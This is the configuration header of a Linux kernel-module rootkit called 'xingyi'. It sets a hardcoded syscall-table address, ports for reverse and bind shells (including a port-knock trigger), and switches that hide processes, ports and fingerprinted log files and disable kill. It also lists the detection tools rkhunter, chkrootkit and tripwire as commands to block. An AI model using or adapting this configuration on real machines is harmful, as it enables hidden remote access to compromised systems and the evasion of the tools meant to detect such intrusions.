#ifndef _xingyi_lkm_config_H_
#define _xingyi_lkm_config_H_

/* sys_call_table on ubuntu 10.10 i386 */

unsigned long *proto_sys_call = (unsigned long *) 0xffffffff81600300;
int reverse_shell_port = 7777;
int knock_reverse_shell_port = 1337;
int bind_port = 7777;
char *_hidden_reverse_shell_pid = NULL;
char *_hidden_bind_shell_pid = NULL;
int should_i_disable_sys_kill = 1;
int should_i_hide_process = 1;
int should_i_hide_port = 1;
/* log file names must contains fingerprint string in order to get hidden */
char *log_reverse_pid = "/tmp/xingyi_reverse_pid";
char *log_bind_pid = "/tmp/xingyi_bindshell_pid";
char *log_reverse_port = "/tmp/xingyi_reverse_port";
char *log_bind_port = "/tmp/xingyi_bindshell_port";
static char cmd_blocked[3][10] = {{"rkhunter"}, {"chkrootkit"}, {"tripwire"}};

#endif

